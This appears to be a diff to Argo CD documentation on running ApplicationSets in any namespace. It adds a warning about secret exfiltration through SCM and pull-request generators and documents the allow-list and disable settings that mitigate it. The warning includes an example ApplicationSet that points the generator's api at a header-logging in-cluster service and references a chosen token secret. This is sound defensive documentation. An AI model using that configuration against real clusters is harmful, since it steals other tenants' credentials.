@@ -23,7 +23,56 @@ This feature needs [App in any namespace](../app-any-namespace.md) feature activ
 
 This feature can only be enabled and used when your Argo CD ApplicationSet controller is installed as a cluster-wide instance, so it has permissions to list and manipulate resources on a cluster scope. It will *not* work with an Argo CD installed in namespace-scoped mode.
 
-## Implementation details
+### SCM Providers secrets consideration
+
+By allowing ApplicationSet in any namespace you must be aware that any secrets can be exfiltrated using `scmProvider` or `pullRequest` generators.
+
+Here is an example:
+
+```yaml
+apiVersion: argoproj.io/v1alpha1
+kind: ApplicationSet
+metadata:
+  name: myapps
+spec:
+  goTemplate: true
+  goTemplateOptions: ["missingkey=error"]
+  generators:
+  - scmProvider:
+      gitea:
+        # The Gitea owner to scan.
+        owner: myorg
+        # With this malicious setting, user can send all request to a Pod that will log incoming requests including headers with tokens
+        api: http://my-service.my-namespace.svc.cluster.local
+        # If true, scan every branch of every repository. If false, scan only the default branch. Defaults to false.
+        allBranches: true
+        # By changing this token reference, user can exfiltrate any secrets
+        tokenRef:
+          secretName: gitea-token
+          key: token
+  template:
+```
+
+Therefore administrator must restrict the urls of the allowed SCM Providers (example: `https://git.mydomain.com/,https://gitlab.mydomain.com/`) by setting the environment variable `ARGOCD_APPLICATIONSET_CONTROLLER_ALLOWED_SCM_PROVIDERS` to argocd-cmd-params-cm `applicationsetcontroller.allowed.scm.providers`. If another url is used, it will be rejected by the applicationset controller.
+
+For example:
+```yaml
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: argocd-cmd-params-cm
+data:
+  applicationsetcontroller.allowed.scm.providers: https://git.mydomain.com/,https://gitlab.mydomain.com/
+```
+
+!!! note
+    Please note url used in the `api` field of the `ApplicationSet` must match the url declared by the Administrator including the protocol
+
+!!! warning
+    The allow-list only applies to SCM providers for which the user may configure a custom `api`. Where an SCM or PR
+    generator does not accept a custom API URL, the provider is implicitly allowed.
+
+If you do not intend to allow users to use the SCM or PR generators, you can disable them entirely by setting the environment variable `ARGOCD_APPLICATIONSET_CONTROLLER_ALLOW_SCM_PROVIDERS` to argocd-cmd-params-cm `applicationsetcontroller.allow.scm.providers` to `false`.
 
 ### Overview
 
@@ -90,17 +139,19 @@ metadata:
   name: team-one-product-one
   namespace: team-one-cd
 spec:
+  goTemplate: true
+  goTemplateOptions: ["missingkey=error"]
   generators:
     list:
-    - id: infra
+    - name: infra
       project: infra-project
-    - id: team-two
+    - name: team-two
       project: team-two-project
-    template:
-      metadata:
-        name: '{{name}}-escalation'
-      spec:
-        project: "{{project}}"
+  template:
+    metadata:
+      name: '{{.name}}-escalation'
+    spec:
+      project: "{{.project}}"
 ```
   
 ### ApplicationSet names
@@ -163,9 +214,9 @@ For other operations such as `POST` and `PUT`, the `appNamespace` parameter must
 
 For `ApplicationSet` resources in the control plane namespace, this parameter can be omitted.
 
-## Secrets consideration
+## Clusters secrets consideration
 
-By allowing ApplicationSet in any namespace you must be aware that clusters, API token secrets (etc...) can be discovered and used. 
+By allowing ApplicationSet in any namespace you must be aware that clusters can be discovered and used. 
 
 Example:
 
@@ -177,4 +228,4 @@ spec:
   - clusters: {} # Automatically use all clusters defined within Argo CD
 ```
 
-If you don't want to allow users to discover secrets with ApplicationSets from other namespaces you may consider deploying ArgoCD in namespace scope or use OPA rules.
+If you don't want to allow users to discover all clusters with ApplicationSets from other namespaces you may consider deploying ArgoCD in namespace scope or use OPA rules.
